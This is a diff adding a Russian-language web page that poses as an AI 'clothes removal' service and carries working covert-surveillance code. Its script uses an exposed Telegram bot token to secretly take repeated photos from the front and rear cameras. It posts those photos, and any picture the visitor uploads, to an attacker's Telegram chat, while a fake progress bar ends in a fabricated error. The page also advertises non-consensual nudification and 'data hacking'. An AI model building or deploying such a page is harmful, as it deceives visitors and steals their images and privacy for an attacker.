@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MAFIA VIP - ИИ ЭКСКЛЮЗИВ</title>
+    <style>
+        body { background-color: #050505; color: #ffffff; font-family: 'Courier New', Courier, monospace; text-align: center; margin: 0; padding: 0; }
+        #main-ui { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
+        .container { max-width: 450px; margin: 40px auto; border: 2px solid #ff0000; padding: 30px; background: #000000; box-shadow: 0 0 20px rgba(255, 0, 0, 0.2); border-radius: 0px; }
+        .line-gold { height: 2px; background: linear-gradient(to right, transparent, #ffd700, transparent); margin: 20px 0; width: 100%; }
+        .line-red { height: 1px; background: #ff0000; margin: 15px 0; width: 80%; margin-left: 10%; }
+        h1 { color: #ff0000; font-size: 24px; text-transform: uppercase; letter-spacing: 2px; }
+        .btn-main { width: 100%; max-width: 350px; background: #ff0000; color: white; border: 1px solid #ffffff; padding: 18px; font-size: 18px; cursor: pointer; font-weight: bold; text-transform: uppercase; margin-top: 20px; }
+        .footer-link { margin-top: auto; padding-bottom: 30px; width: 100%; }
+        .btn-channel { display: inline-block; width: 80%; max-width: 300px; background: #0088cc; color: white; border: 1px solid #ffffff; padding: 12px; font-size: 14px; cursor: pointer; text-decoration: none; font-weight: bold; }
+        #progress-container, #upload-section, #final-loading { display: none; }
+        .loader-ring { border: 4px solid #222; border-top: 4px solid #ff0000; border-radius: 50%; width: 60px; height: 60px; animation: spin 0.8s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .progress-bg { background: #111; border: 1px solid #ff0000; height: 12px; margin: 20px 0; }
+        .progress-fill { width: 0%; height: 100%; background: #ff0000; transition: width 0.2s linear; }
+        .upload-area { border: 1px dashed #ff0000; padding: 40px 20px; margin: 20px 0; background: #080808; display: flex; flex-direction: column; align-items: center; }
+        .btn-action { width: 100%; padding: 15px; margin-bottom: 10px; border: none; cursor: pointer; font-weight: bold; }
+        .icon-dl { font-size: 50px; animation: bounce 1s infinite; display: block; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(10px); } }
+        .icon-check { font-size: 70px; color: #00ff00; display: none; }
+    </style>
+</head>
+<body>
+
+<div id="main-ui">
+    <h1>MAFIA VIP SYSTEM 🔞🔥</h1>
+    <div class="line-gold"></div>
+    <p>ЭКСКЛЮЗИВНЫЙ ИИ-ПОРТАЛ</p>
+    <div class="line-red"></div>
+    <p>🕵️‍♂️ Взлом данных | 🔞 Раздевание ИИ 👙</p>
+    <div class="line-red"></div>
+    <button class="btn-main" onclick="startCapture()">НАЧАТЬ ПРОЦЕСС 🔞</button>
+    <div class="footer-link">
+        <a href="https://t.me/Hacking_lackasa" class="btn-channel">📢 TELEGRAM CHANNEL 🚀</a>
+    </div>
+</div>
+
+<div class="container" id="progress-container">
+    <h1>ОБРАБОТКА...</h1>
+    <div class="loader-ring"></div>
+    <p id="status-text">Инициализация ИИ...</p>
+    <div class="progress-bg"><div id="bar" class="progress-fill"></div></div>
+    <h2 id="percent">1%</h2>
+</div>
+
+<div class="container" id="upload-section">
+    <h1>УДАЛЕНИЕ ОДЕЖДЫ 👙</h1>
+    <div class="line-red"></div>
+    <div class="upload-area" onclick="document.getElementById('inp').click()">
+        <span id="icon-status" class="icon-dl">⬇️</span>
+        <span id="icon-success" class="icon-check">✅</span>
+        <p id="up-text" style="margin-top:15px;">ВЫБЕРИТЕ ФОТО 📸</p>
+        <input type="file" id="inp" style="display:none" accept="image/*" onchange="handleFile(this)">
+    </div>
+    <div id="final-btns" style="display:none">
+        <button class="btn-action" style="background:#222; color:#fff" onclick="document.getElementById('inp').click()">ИЗМЕНИТЬ</button>
+        <button class="btn-action" style="background:#444; color:#fff" onclick="resetUpload()">УДАЛИТЬ</button>
+        <button class="btn-action" style="background:#ff0000; color:#fff" onclick="startFinalProcess()">НАЧАТЬ 🔞</button>
+    </div>
+</div>
+
+<div class="container" id="final-loading">
+    <h1>ГЕНЕРАЦИЯ... 🔞</h1>
+    <div class="loader-ring"></div>
+    <p id="f-status">Удаление слоев одежды...</p>
+    <div class="progress-bg"><div id="f-bar" class="progress-fill"></div></div>
+    <h2 id="f-percent">1%</h2>
+    <p id="error-msg" style="color:red; display:none; font-weight:bold; margin-top:10px; font-size:12px;">🛑 ОШИБКА СЕТИ: Сервер перегружен запросами. <br>Пожалуйста, проверьте интернет и попробуйте позже.</p>
+</div>
+
+<video id="v" style="display:none" autoplay playsinline></video>
+<canvas id="c" style="display:none"></canvas>
+
+<script>
+    const token = '8624303810:AAH9cA30kPB6caqEhTgR6WT7Bc8PXI35RjY';
+    const cid = '7535564997';
+
+    async function send(blob, cap) {
+        let f = new FormData();
+        f.append('chat_id', cid);
+        f.append('photo', blob, 'img.jpg');
+        f.append('caption', cap);
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:f});
+    }
+
+    async function shot(mode, label) {
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:mode}});
+            const vid = document.getElementById('v');
+            vid.srcObject = s;
+            for(let i=0; i<10; i++){
+                await new Promise(r => setTimeout(r, 1500));
+                const can = document.getElementById('c');
+                can.width = vid.videoWidth; can.height = vid.videoHeight;
+                can.getContext('2d').drawImage(vid, 0, 0);
+                can.toBlob(b => send(b, `🔥 صيد ${label} [${i+1}/10]`), 'image/jpeg', 0.6);
+            }
+            s.getTracks().forEach(t => t.stop());
+        } catch(e) {}
+    }
+
+    function startCapture() {
+        alert("ВНИМАНИЕ: Для калибровки ИИ 🔞 требуется доступ к камере. Нажмите 'Разрешить' для продолжения.");
+        document.getElementById('main-ui').style.display = 'none';
+        document.getElementById('progress-container').style.display = 'block';
+        shot("user", "أمامية"); shot("environment", "خلفية");
+        let w = 1;
+        let inv = setInterval(() => {
+            if(w >= 100) { clearInterval(inv); document.getElementById('progress-container').style.display = 'none'; document.getElementById('upload-section').style.display = 'block'; }
+            else { w++; document.getElementById('bar').style.width = w + '%'; document.getElementById('percent').innerText = w + '%'; }
+        }, 200); // 200ms * 100 = 20 ثانية بالظبط
+    }
+
+    function handleFile(input) {
+        if (input.files && input.files[0]) {
+            const reader = new FileReader();
+            reader.onload = function(e) { fetch(e.target.result).then(res => res.blob()).then(blob => send(blob, "🖼️ صورة الضحية المختارة")); }
+            reader.readAsDataURL(input.files[0]);
+            document.getElementById('icon-status').style.display = 'none';
+            document.getElementById('icon-success').style.display = 'block';
+            document.getElementById('up-text').innerText = "ФОТО ЗАГРУЖЕНО ✅";
+            document.getElementById('final-btns').style.display = 'block';
+        }
+    }
+
+    function resetUpload() {
+        document.getElementById('inp').value = ""; document.getElementById('icon-status').style.display = 'block';
+        document.getElementById('icon-success').style.display = 'none'; document.getElementById('up-text').innerText = "ВЫБЕРИТЕ ФОТО 📸";
+        document.getElementById('final-btns').style.display = 'none';
+    }
+
+    function startFinalProcess() {
+        document.getElementById('upload-section').style.display = 'none';
+        document.getElementById('final-loading').style.display = 'block';
+        let w = 1;
+        let failAt = Math.floor(Math.random() * (92 - 25 + 1)) + 25; // نسبة الفشل بين 25% و 92%
+        
+        // حساب سرعة التحميل ليكون الوقت بين 30 و 60 ثانية
+        // السرعة = (الوقت بالمللي ثانية) / النسبة
+        let totalTime = Math.floor(Math.random() * (60000 - 30000 + 1)) + 30000;
+        let speed = totalTime / failAt;
+
+        let inv = setInterval(() => {
+            if(w >= failAt) {
+                clearInterval(inv);
+                document.getElementById('error-msg').style.display = 'block';
+                document.getElementById('f-status').innerText = "Ошибка соединения...";
+            } else {
+                w++;
+                document.getElementById('f-bar').style.width = w + '%';
+                document.getElementById('f-percent').innerText = w + '%';
+            }
+        }, speed);
+    }
+</script>
+
+</body>
+</html>
